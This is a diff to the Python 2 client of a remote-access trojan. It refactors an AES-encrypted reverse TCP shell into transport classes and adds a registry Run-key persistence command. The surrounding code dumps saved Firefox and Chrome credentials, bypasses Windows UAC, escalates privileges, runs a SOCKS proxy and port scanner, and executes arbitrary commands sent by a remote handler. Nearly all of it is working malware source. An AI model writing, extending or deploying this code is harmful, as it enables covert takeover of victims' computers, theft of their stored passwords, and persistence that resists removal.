@@ -1,11 +1,11 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string
 from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
 import dumpff
 if os.name =="nt":
-    import dumpchrome, win32net, pupy_privesc
+	import dumpchrome, win32net, pupy_privesc
 
 HANDLER_IP = "127.0.0.1"
 
@@ -14,31 +14,57 @@ def windows_only(func):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(*args)
 	return tester
-
-class StoppableThread(threading.Thread):
-	def __init__(self, target):
-		super(StoppableThread, self).__init__()
-		self.run = target
-		self._stop = threading.Event()
-		
-	def stop(self):
-		self._stop.set()
-		
-	def stopped(self):
-		return self._stop.isSet()
-
-class Shell:
+	
+class Transport:
 	def __init__(self, handler_ip, handler_port):
 		self.handler_ip = handler_ip
 		self.handler_port = handler_port
 		
-		self.comm_socket = socket.socket()
-		
 		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
 		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
 		
-		self.killed = False
-		self.threads = []
+	def send(self, data):
+		pass
+		
+	def recv(self, data):
+		pass
+		
+	def connect(self):
+		pass
+		
+	def package(self, data):
+		package = {}
+		package["cwd"] = base64.b64encode(os.getcwd())
+		package["ip"] = base64.b64encode("192.168.1.355")
+		package["data"] = base64.b64encode(data)
+		package["username"] = base64.b64encode(getpass.getuser())
+		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
+		package["hostname"] = base64.b64encode(socket.gethostname())
+
+		for key in package.keys():
+			if key not in self.sent_info: package[key] = ""
+			
+		return json.dumps(package)
+		
+	def set_package_items(self, items):
+		if items == "minimal":
+			self.sent_info = ["data"]
+		elif items == "small":
+			self.sent_info = ["data","cwd"]
+		elif items == "userathost":
+			self.sent_info = ["data","cwd","username","hostname"]
+		else:
+			self.sent_info = items.split()
+			for item in list(self.sent_info):
+				if item not in self.possible_info:
+					self.sent_info.remove(item)
+			if "data" not in self.sent_info: self.sent_info.append("data")
+		return "Now sending "+repr(self.sent_info)
+		
+class EncryptedReverseTCP(Transport):
+	def __init__(self, handler_ip, handler_port):
+		Transport.__init__(self, handler_ip, handler_port)
+		self.comm_socket = socket.socket()
 		
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
@@ -59,6 +85,12 @@ class Shell:
 		print key, IV
 	
 		return key, IV
+
+	def connect(self):
+		self.comm_socket.connect((self.handler_ip, self.handler_port))
+		
+		key, IV = self.gen_diffie_key()
+		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
 		
 	def encrypt(self, data):
 		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
@@ -71,14 +103,13 @@ class Shell:
 		
 	def decompress(self, data):
 		return zlib.decompress(data)
-
-	def connect(self):
-		self.comm_socket.connect((self.handler_ip, self.handler_port))
 		
-		key, IV = self.gen_diffie_key()
-		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
+	def send(self, data):
+		data_package = self.package(data)
+		data_package = self.encrypt(data_package)
+		self.comm_socket.sendall(data_package+chr(255))
 		
-	def get_data(self):
+	def recv(self):
 		data = ""
 		while not data.endswith(chr(255)):
 			c = self.comm_socket.recv(4096)
@@ -86,41 +117,24 @@ class Shell:
 			data += c
 		data = self.decrypt(data)
 		return data
+
+class StoppableThread(threading.Thread):
+	def __init__(self, target):
+		super(StoppableThread, self).__init__()
+		self.run = target
+		self._stop = threading.Event()
 		
-	def set_package_items(self, items):
-		if items == "minimal":
-			self.sent_info = ["data"]
-		elif items == "small":
-			self.sent_info = ["data","cwd"]
-		elif items == "userathost":
-			self.sent_info = ["data","cwd","username","hostname"]
-		else:
-			self.sent_info = items.split()
-			for item in list(self.sent_info):
-				if item not in self.possible_info:
-					self.sent_info.remove(item)
-			if "data" not in self.sent_info: self.sent_info.append("data")
-		return "Now sending "+repr(self.sent_info)
+	def stop(self):
+		self._stop.set()
 		
-	def package(self, data):
-		package = {}
-		package["cwd"] = base64.b64encode(os.getcwd())
-		package["ip"] = base64.b64encode("192.168.1.355")
-		package["data"] = base64.b64encode(data)
-		package["username"] = base64.b64encode(getpass.getuser())
-		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
-		package["hostname"] = base64.b64encode(socket.gethostname())
+	def stopped(self):
+		return self._stop.isSet()
 
-		for key in package.keys():
-			if key not in self.sent_info: package[key] = ""
-			
-		return json.dumps(package)
-
-
-	def send_data(self, data):
-		data_package = self.package(data)
-		data_package = self.encrypt(data_package)
-		self.comm_socket.sendall(data_package+chr(255))
+class Shell:
+	def __init__(self, transport):
+		self.transport = transport
+		self.killed = False
+		self.threads = []
 		
 	def kill_proc(self, pid):
 		print "kill proc firing"
@@ -148,7 +162,7 @@ class Shell:
 	@windows_only
 	def dumpff(self):
 		return dumpff.main()
-       
+	   
 	@windows_only
 	def dumpchrome(self):
 		return dumpchrome.main()
@@ -228,7 +242,7 @@ class Shell:
 			t.daemon = True
 			t.start()
 			self.threads.append(t)
-			return "Proxy started. WARNING: Due to the nature of Twisted, you can't restart the proxy after stopping it. Make sure you won't need the proxy before stopping it!"
+			return "Proxy started. WARNING: Due to the nature of Twisted, you can't restart the proxy after stopping it. Make sure you won't need the proxy again before stopping it!"
 		except:
 			return "Failed to start proxy."
 		
@@ -240,19 +254,19 @@ class Shell:
 		
 	def is_admin(self):
 		if os.name == "nt":
-			return __import__("ctypes").windll.shell32.IsUserAnAdmin() != 0
+			return ctypes.windll.shell32.IsUserAnAdmin() != 0
 		else:
 			return os.geteuid() == 0
 			
 	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
 		return ''.join([i if ord(i) < 128 else '' for i in string])
-     
+	 
 	@windows_only
 	def is_user_in_group(self, group, member): # Check if user is member of a group.
 		members = win32net.NetLocalGroupGetMembers(None, group, 1)
 		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
 		return False
-     
+	 
 	@windows_only
 	def name_of_admin_group(self): # Get name of Administrators group.
 		for line in self.execute_shell_command("whoami /groups").splitlines():
@@ -263,10 +277,10 @@ class Shell:
 	def bypass_uac(self):
 		if self.is_admin():
 			return "You already have admin privileges!"
-         
+		 
 		if not self.is_user_in_group(self.name_of_admin_group(), getpass.getuser()):
 			return "Current user is not part of admin group."
-         
+		 
 		if not self.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
 			return "UAC is disabled or notification policy is set to 'Always'"
 			
@@ -361,6 +375,23 @@ class Shell:
 			out += "\n"
 			
 		return out
+		
+	@windows_only
+	def persist(self):
+		random_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+		if self.is_admin():
+			retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
+			retval.communicate()
+			print(retval.returncode)
+			if retval.returncode == 0:
+				return("Succesfully added file to registry for local machine.")
+		else:
+			retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
+			retval.communicate()
+			if retval.returncode == 0:
+				return("Succesfully added file to current user's registry.")
+				
+		return "Failed to add file to registry."
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -406,8 +437,10 @@ class Shell:
 			except Exception as e:
 				print e
 				output = "usage: portscan [host_range] [port_range]"
+		elif command == "persist":
+			output = self.persist()
 		elif command == "die":
-			self.comm_socket.close()
+			self.transport.comm_socket.close()
 			os._exit(0)
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
@@ -417,19 +450,19 @@ class Shell:
 		
 	def run(self):
 		while True:
-			data = self.get_data()
+			data = self.transport.recv()
 			if not data.startswith("LIST_FILES"): print data
 			output = self.handle_command(data)
-			self.send_data(output)
+			self.transport.send(output)
 			
 while True:
 	try:
-		shell = Shell(HANDLER_IP, 8080)
-		shell.connect()
+		shell = Shell(EncryptedReverseTCP(HANDLER_IP, 8080))
+		shell.transport.connect()
 		shell.run()
 	except Exception as e:
 		print e
-		shell.comm_socket.close()
+		shell.transport.comm_socket.close()
 		for t in shell.threads:
 			t.stop()
 		time.sleep(10)
